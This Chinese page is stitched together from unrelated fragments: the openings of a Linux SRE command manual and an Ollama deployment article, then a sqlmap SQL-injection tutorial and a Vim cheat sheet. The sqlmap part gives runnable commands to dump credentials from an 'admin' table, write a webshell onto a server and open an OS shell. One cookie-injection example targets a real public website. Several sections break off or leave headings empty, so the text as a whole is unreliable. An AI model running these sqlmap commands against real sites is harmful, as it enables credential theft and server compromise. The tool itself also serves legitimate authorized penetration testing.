Linux 生产环境命令实战手册：从诊断到架构的 SRE 最佳实践

1. 背景：为什么需要系统化的命令知识体系

在生产环境中，故障往往发生在凌晨 3 点，此时没有 GUI、没有监控面板，只有一个 SSH 终端和你对 Linux 命令的肌肉记忆。典型场景包括：应用突然无响应需要快速定位是 CPU、内存还是网络问题；磁盘空间告警需要立即找出占用大户；进程僵死需要安全重启而不影响其他服务；网络抖动需要追踪数据包路径。更复杂的情况是多个子系统同时异常，需要在 5 分钟内建立因果链。

传统运维依赖经验和直觉，但现代 SRE 要求可重复的诊断流程。问题的本质是：系统由进程、文件、网络、磁盘四大资源构成，任何故障都是资源的异常消耗或阻塞。掌握命令不是为了炫技，而是建立从现象到根因的最短路径。例如 top 显示 CPU 100% 只是表象，需要用 perf 或 strace 才能定位到具体系统调用。

本文将命令分为诊断类（只读、安全）和操作类（写入、有风险），并强制要求所有操作遵循 backup-execute-verify 三段式。适用于管理 10+ 台服务器的团队，单机运维可简化流程但必须保留备份步骤。所有示例基于 CentOS 7/8 和 Ubuntu 20.04 LTS，内核版本 >= 3.10。

Ollama 本地大模型运行框架：从部署到生产级 MCP 集成实践

一、背景：为什么需要本地 LLM 运行时

在生产环境中，依赖外部 LLM API 存在三大痛点：数据隐私泄露风险（敏感代码/日志不能上传）、成本不可控（高频调用月账单可达数千美元）、网络依赖（内网环境或离线场景无法使用）。Ollama 作为 Go 实现的轻量级模型运行时，通过 GGUF 量化格式将 7B-70B 模型压缩至 4-40GB，使单机部署成为可能。

典型场景包括：代码补全（Tabby/Continue）需要毫秒级响应、日志分析需要批量处理敏感数据、边缘设备（NAS/树莓派）需要离线推理能力。相比 vLLM/TGI 等推理框架，Ollama 牺牲了部分并发性能，换取零配置启动和跨平台一致性（macOS Metal/Linux CUDA/Windows ROCm）。

关键权衡：Ollama 适合单用户/小团队快速验证，生产级高并发场景仍需 vLLM + KServe；模型选择需平衡质量与资源，7B 模型（如 Llama3.2/Qwen2.5）在 16GB 内存设备上可达 GPT-3.5 80% 能力。

sqlmap简介

sqlmap支持五种不同的注入模式：

  • 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
  • 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
  • 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
  • 4、联合查询注入，可以使用union的情况下的注入。
  • 5、堆查询注入，可以同时执行多条语句的执行时的注入。

sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

检测注入

基本格式

sqlmap -u "http://www.vuln.cn/post.php?id=1"

默认使用level1检测全部数据库类型

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

跟随302跳转

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
当注入错误的时候，先报错再跳转的时候，不需要跟随302。
目的就是：要追踪到错误信息。

cookie注入

当程序有防get注入的时候，可以使用cookie注入
sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）

从post数据包中注入

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql    指定username参数

注入成功后

获取数据库基本信息

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 --dbs

查询有哪些数据库

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test --tables

查询test数据库中有哪些表

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin --columns

查询test数据库中admin表有哪些字段

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin -C "username,password" --dump

dump出字段username与password中的数据

其他命令参考下面

从数据库中搜索字段

sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password
在dedecms数据库中搜索字段admin或者password。

读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
#示例：
sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

使用shell命令：

sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell
接下来指定网站可写目录：
“E:\php\htdocs\dvwa”

#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

  • --risk=RISK 执行测试的风险（0-3，默认为1）
  • --string=STRING 查询时有效时在页面匹配字符串
  • --regexp=REGEXP 查询时有效时在页面匹配正则表达式
  • --text-only 仅基于在文本内容比较网页

Techniques（技巧）：

Fingerprint（指纹）：

VIM

2026-09-19 Linux

Vi编辑器是所有Unix及Linux系统下标准的编辑器，

vi和vim都是Linux中的编辑器，不同的是，vim比较高级，可以视为vi的升级版本。vi使用于文本编辑，但是vim更适用于coding（写代码的）。

Vim重点是光标的移动，模式切换，删除，查找，替换，复制，粘贴，撤销命令的使用。

三种模式

  • 命令模式：在该模式下是不能对文件直接编辑，可以输入快捷键进行一些操作（删除行，复制行，移动光标，粘贴等等）【打开文件之后默认进入的模式】；
  • 编辑模式：在该模式下可以对文件的内容进行编辑；
  • 末行模式：可以在末行输入命令来对文件进行操作（搜索、替换、保存、退出、撤销、高亮等等）；

命令模式

光标移动

  • 行首 按键shift + 6 或 ^
  • 行尾 按键shift + 4 或 $
  • 首行 gg
  • 末行 G
  • 翻屏
    • 向上翻屏 按键ctrl + b （before） 或 PgUp
    • 向下翻屏 按键ctrl + f （after） 或 PgDn

复制操作

  • 所在行 yy
  • 粘贴：在想要粘贴的地方按下p键

剪切/删除

  • 剪切/删除光标所在行 dd
  • 剪切/删除光标所在的当前行之后的内容，但是删除之后下一行不上移 D

撤销/恢复

  • 撤销 u （undo）
  • 撤销5个改变 :undo 5
  • 你的撤销历史 :undolist
  • 重做最后的改动 按键ctrl + r:
  • 取消当前行中所有的改动 U:
  • 回到4分钟前 :earlier 4m
  • 前进55秒 :later 55s

替换

r: 替换光标处的字符，同样支持汉字。
R: 进入替换模式，按esc回到正常模式。

末行模式

进入方式：由命令模式进入，按下:或者/（表示查找）即可进入
退出方式：

  1. 按下按键esc
  2. 连按2次按键esc键
  3. 删除末行全部输入字符
  • 保存文件:w
  • 另存为:w 路径
  • 退出文件:q
  • 保存并且退出:wq
  • 表示强制退出，刚才做的修改操作不做保存:q!
  • :!外部命令
  • /关键词 搜索查找
  • 替换 -> %表示整个文件 g表示全局（global）
    • :s/搜索的关键词/新的内容 (替换光标所在行的第一处符合条件的内容)
    • :s/搜索的关键词/新的内容/g (替换光标所在行的全部符合条件的内容)
    • :%s/搜索的关键词/新的内容 (替换整个文档中每行第一个符合条件的内容)
    • :%s/搜索的关键词/新的内容/g (替换整个文档的符合条件的内容)
  • 显示行号（临时）
    • :set nu[number]
    • :set nonu
  • 文件多开:files
    • 果需要指定切换文件的名称，则可以输入:open 已经打开的文件名
    • “:bn”切换到下一个文件（back next）
    • “:bp”切换到上一个文件（back prev）
分屏功能

  • 分屏

    • 水平方向分屏打开新文件 横向切分 :sp文件名 :split文件名
    • 垂直方向分屏打开新文件 竖向切分 :vsp文件名 :vsplit文件名
    • 上下分割当前打开的文件 按键Ctrl+w s
    • 左右分割当前打开的文件 按键Ctrl+w v

  • 关闭分屏

    • 关闭当前窗口按键Ctrl+w c
    • 关闭当前窗口，如果只剩最后一个了，则退出Vim按键Ctrl+w q

  • 移动光标

    • 把光标移到右边的屏 按键Ctrl+w l
    • 把光标移到左边的屏中 按键Ctrl+w h
    • 把光标移到上边的屏中 按键Ctrl+w k
    • 把光标移到下边的屏中 按键Ctrl+w j
    • 把光标移到下一个的屏中 按键Ctrl+w w

  • 移动分屏

    • 向右移动 按键Ctrl+w L
    • 向左移动 按键Ctrl+w H
    • 向上移动 按键Ctrl+w K
    • 向下移动 按键Ctrl+w J

  • 屏幕尺寸

    • 让所有的屏都有一样的高度 按键Ctrl+w =
    • 增加高度 按键Ctrl+w +
    • 减少高度 按键Ctrl+w -
